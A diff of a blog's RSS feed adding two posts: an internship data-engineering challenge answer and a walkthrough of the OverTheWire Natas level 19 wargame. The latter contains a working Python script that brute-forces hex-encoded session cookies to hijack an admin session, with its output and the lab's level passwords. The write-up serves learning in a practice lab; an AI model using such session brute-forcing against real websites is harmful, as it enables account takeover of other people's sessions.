@@ -7,10 +7,179 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>cn</language>
     <copyright>Copyright © 2008–2019</copyright>
-    <lastBuildDate>Mon, 26 Aug 2024 14:47:03 +0300</lastBuildDate>
+    <lastBuildDate>Fri, 30 Aug 2024 16:03:22 +0300</lastBuildDate>
     
 	<atom:link href="//localhost:1313/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>Tecknoworks-Intenship challange</title>
+      <link>//localhost:1313/post/tecknoworks_challange/</link>
+      <pubDate>Fri, 30 Aug 2024 16:03:22 +0300</pubDate>
+      
+      <guid>//localhost:1313/post/tecknoworks_challange/</guid>
+      <description>&lt;h1 id=&#34;premise&#34;&gt;Premise&lt;/h1&gt;
+&lt;h4 id=&#34;overview&#34;&gt;Overview&lt;/h4&gt;
+&lt;p&gt;This technical project is designed to evaluate your technical skills, creativity, and problem-solving abilities
+in both Data Engineering and Artificial Intelligence. The project will help us assess how well you
+understand the concepts and tools you&amp;rsquo;ll be working with during the internship. The project should take
+no more than 2 to 3 hours to complete.&lt;/p&gt;
+&lt;h4 id=&#34;project-description&#34;&gt;Project Description&lt;/h4&gt;
+&lt;p&gt;You are tasked with designing a simple data pipeline using Microsoft Fabric and performing data science
+tasks using Python. Most likely, you don&amp;rsquo;t have experience with Microsoft Fabric. We&amp;rsquo;re interested in how
+your mind works when you have to face a challenge like this. Microsoft Fabric is a comprehensive data
+analytics platform that integrates data engineering, data science, data warehousing, and business
+intelligence in one environment. By using Microsoft Fabric, we expect our interns to gain hands-on
+experience with a tool that Microsoft expects to be widely adopted in the industry. This exposure not only
+makes you more competitive in the job market but also prepares you for real-world scenarios where you
+are likely to encounter similar integrated platforms.&lt;br&gt;
+Microsoft Fabric is a paid tool, so in order to solve these exercises, you have to simply read the
+documentation to have an introduction to the tool, watch a few tutorials if needed and answer the
+questions based on your findings and your prior knowledge from University courses. You don&amp;rsquo;t need to
+access Fabric for this basic assignment. You don&amp;rsquo;t have to implement the solution, only to design it based
+on the documentation that you read. You can use text descriptions or any type of visual representation to
+answer the questions (e.g. Dataflow diagrams) for Section 1. For Section 2 you can implement the solution
+for free using Google Colab or any other local python environment.&lt;br&gt;
+The project is divided into two main sections: Data Engineering and Artificial Intelligence.&lt;/p&gt;
+&lt;h1 id=&#34;section-1&#34;&gt;Section 1&lt;/h1&gt;
+&lt;h4 id=&#34;scenario&#34;&gt;Scenario&lt;/h4&gt;
+&lt;p&gt;You are a new data engineer at a retail company. The company has a dataset containing information on
+customer transactions. Your task is to design and implement a data pipeline that ingests, processes, and
+stores this data using Microsoft Fabric.&lt;br&gt;
+The dataset is available here: &lt;a href=&#34;https://www.kaggle.com/datasets/fahadrehman07/retail-transaction-dataset?resource=download&#34;&gt;https://www.kaggle.com/datasets/fahadrehman07/retail-transaction-dataset?resource=download&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;task-1-premise&#34;&gt;Task 1 premise&lt;/h4&gt;
+&lt;p&gt;Question: First, you have to bring this data into Fabric. How do you envision this? What will be the expected
+steps? How exactly will it be stored? Is the data in a suitable format and size to ingest in Fabric? What can
+you do related to storage in order to improve the performance of the future data queries if the size of the
+dataset is expected to grow in time (hint: e.g. partition the data)?
+(Answer with text descriptions or diagrams)&lt;/p&gt;
+&lt;h4 id=&#34;task-1-solution&#34;&gt;Task 1 solution&lt;/h4&gt;
+&lt;p&gt;Firstly, I will begin by looking at the data set given in the premise in order to get a feeling for what I am working with.&lt;br&gt;
+The data set is presented in &lt;strong&gt;csv format and has a size of around 13MB (important for later)&lt;/strong&gt;. It seems to be a &lt;strong&gt;retail transaction data set&lt;/strong&gt;, basically oferring you a peak at common consumer purchase patterns with the present collumns being : &lt;strong&gt;CustomerId, ProductId, Quantity, Price, TransactionDate, PaymentMethod, StoreLocation, ProductCategory, AppliedDiscount and TotalAmount&lt;/strong&gt;.&lt;br&gt;
+Since the data set is given in csv format which is compatible with the import feature of &lt;strong&gt;Microsoft Fabric&lt;/strong&gt; and the size is not significant, the import should be pretty straight forward. We should plan for further expansion tho.&lt;br&gt;
+&lt;strong&gt;Okay, how how do I import it?&lt;/strong&gt; Firstly, in what? A quick look around google later, the most obvious choice was between a &lt;strong&gt;Data Lake or a Data Warehouse&lt;/strong&gt;. I would go with a &lt;strong&gt;Data Warehouse&lt;/strong&gt; since it is meant for already structured data (exactly like my data set) while a &lt;strong&gt;Data Lake&lt;/strong&gt; is more inclined towards raw data meant for analysis and further implications in various projects. &lt;a href=&#34;https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-a-data-lake#:~:text=risks%20more%20efficiently.-,What&#39;s%20the%20difference%20between%20a%20data%20lake%20and%20a%20data,as%20specific%20BI%20use%20cases.&#34;&gt;Source.&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Natas-Level 19</title>
+      <link>//localhost:1313/post/natas19/</link>
+      <pubDate>Tue, 27 Aug 2024 12:53:35 +0300</pubDate>
+      
+      <guid>//localhost:1313/post/natas19/</guid>
+      <description>&lt;h3 id=&#34;login&#34;&gt;Login&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Username: natas19&lt;/em&gt;&lt;br&gt;
+&lt;em&gt;Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&lt;/em&gt;&lt;br&gt;
+&lt;em&gt;URL:      &lt;a href=&#34;http://natas19.natas.labs.overthewire.org&#34;&gt;http://natas19.natas.labs.overthewire.org&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;h3 id=&#34;doc&#34;&gt;Doc&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Brute-force_attack&#34;&gt;What is brute-forcing?&lt;/a&gt;&lt;br&gt;
+In cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.&lt;br&gt;
+&lt;a href=&#34;https://en.wikipedia.org/wiki/Python_(programming_language)&#34;&gt;What is python?&lt;/a&gt;&lt;br&gt;
+Python is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.&lt;br&gt;
+&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie&#34;&gt;What is a cookie?🍪&lt;/a&gt;&lt;br&gt;
+HTTP cookies are small blocks of data created by a web server while a user is browsing a website and placed on the user&amp;rsquo;s computer or other device by the user&amp;rsquo;s web browser. Cookies are placed on the device used to access a website, and more than one cookie may be placed on a user&amp;rsquo;s device during a session.&lt;/p&gt;
+&lt;h3 id=&#34;tools&#34;&gt;Tools&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;
+&lt;img src=&#34;//localhost:1313/img/natas/natas19-1.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+This level seems identical so far with &lt;strong&gt;natas18&lt;/strong&gt;, the only notable difference present being the fact that the prompt tells us that now, session ID`s are no longer sequential. Let`s look at the cookies for a second in order to see what is being stored.
+&lt;img src=&#34;//localhost:1313/img/natas/natas19-2.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+As we can see, this time the &lt;strong&gt;PHPSESSID&lt;/strong&gt; variable seems to contain a HEX encoded string. Using cyberchef we can see how it is being translated and what data it communicates.
+&lt;img src=&#34;//localhost:1313/img/natas/natas19-3.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+As you can see, the format seems to be the following &lt;strong&gt;SessionId&lt;/strong&gt;+&lt;strong&gt;loginUser&lt;/strong&gt;. You can play a bit with the format by deleting characters in the initial HEX encoding in order to sepparate the part we are interested in.
+&lt;img src=&#34;//localhost:1313/img/natas/natas19-4.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+As you can see, I`ve managed to sepparate the &lt;strong&gt;-admin&lt;/strong&gt; part out of the final string, this will be helpful later.
+&lt;h4 id=&#34;whats-the-idea&#34;&gt;What`s the idea?&lt;/h4&gt;
+&lt;p&gt;To solve this, the first thing that came to mind was:&lt;br&gt;
+Always append the &lt;strong&gt;-admin&lt;/strong&gt; part to the string that is composed from the &lt;strong&gt;SessionId&lt;/strong&gt;, and we will progressively parse through id`s until the response we get from the server is not the generic:&lt;/p&gt;
+&lt;img src=&#34;//localhost:1313/img/natas/natas19-5.png&#34; alt=&#34;gif&#34; style=&#34;display: block; margin-left: auto; margin-right: auto;&#34;&gt;
+&lt;br&gt;
+We can modify the python script from the previous level to achieve this goal since the backcode for this level is identical. It is important to remember that the string has to be encoded into HEX in order for the cookie to be valid.
+&lt;h4 id=&#34;python-script&#34;&gt;Python script:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import requests
+import binascii
+
+url = &amp;#34;http://natas19.natas.labs.overthewire.org&amp;#34;
+
+# Set up a session with basic auth
+s = requests.Session()
+s.auth = (&amp;#39;natas19&amp;#39;, &amp;#39;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&amp;#39;)
+
+def try_login(session_id):
+    # Convert session ID to a hex-encoded string
+    tmp = f&amp;#34;{session_id}-admin&amp;#34;
+    val = binascii.hexlify(tmp.encode(&amp;#39;utf-8&amp;#39;)).decode(&amp;#39;ascii&amp;#39;)
+
+    # Set up the cookie
+    cookies = {&amp;#39;PHPSESSID&amp;#39;: val}
+
+    # Send the request
+    response = s.get(url, cookies=cookies)
+
+    # Check if the response indicates non-admin access
+    if &amp;#34;Login as an admin to retrieve&amp;#34; in response.text:
+        print(f&amp;#34;Trying: {session_id} - Failed&amp;#34;)
+        return False
+    else:
+        print(f&amp;#34;Success with session ID: {session_id}&amp;#34;)
+        print(response.text)
+        return True
+
+# Iterate over possible session IDs
+for x in range(640):
+    if try_login(x):
+        break
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the running process of this script should be identical to the previous one. The execution might take a little while.&lt;/p&gt;
+&lt;h4 id=&#34;script-execution&#34;&gt;Script execution:&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;01:12:45 archie@Archie py → python3 pythonscript.py
+Trying: 0 - Failed
+Trying: 1 - Failed
+Trying: 2 - Failed
+Trying: 3 - Failed
+Trying: 4 - Failed
+Trying: 5 - Failed
+Trying: 6 - Failed
+Trying: 7 - Failed
+.
+.
+.
+Trying: 274 - Failed
+Trying: 275 - Failed
+Trying: 276 - Failed
+Trying: 277 - Failed
+Trying: 278 - Failed
+Trying: 279 - Failed
+Trying: 280 - Failed
+Success with session ID: 281
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;!-- This stuff in the header has nothing to do with the level --&amp;gt;
+&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;http://natas.labs.overthewire.org/css/level.css&amp;#34;&amp;gt;
+&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;http://natas.labs.overthewire.org/css/jquery-ui.css&amp;#34; /&amp;gt;
+&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;http://natas.labs.overthewire.org/css/wechall.css&amp;#34; /&amp;gt;
+&amp;lt;script src=&amp;#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script src=&amp;#34;http://natas.labs.overthewire.org/js/jquery-ui.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script src=&amp;#34;http://natas.labs.overthewire.org/js/wechall.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script&amp;gt;var wechallinfo = { &amp;#34;level&amp;#34;: &amp;#34;natas19&amp;#34;, &amp;#34;pass&amp;#34;: &amp;#34;tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr&amp;#34; };&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;natas19&amp;lt;/h1&amp;gt;
+&amp;lt;div id=&amp;#34;content&amp;#34;&amp;gt;
+&amp;lt;p&amp;gt;
+&amp;lt;b&amp;gt;
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+&amp;lt;/b&amp;gt;
+&amp;lt;/p&amp;gt;
+You are an admin. The credentials for the next level are:&amp;lt;br&amp;gt;&amp;lt;pre&amp;gt;Username: natas20
+Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, we`ve got the password for &lt;strong&gt;natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw&lt;/strong&gt;&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Natas-Level 18</title>
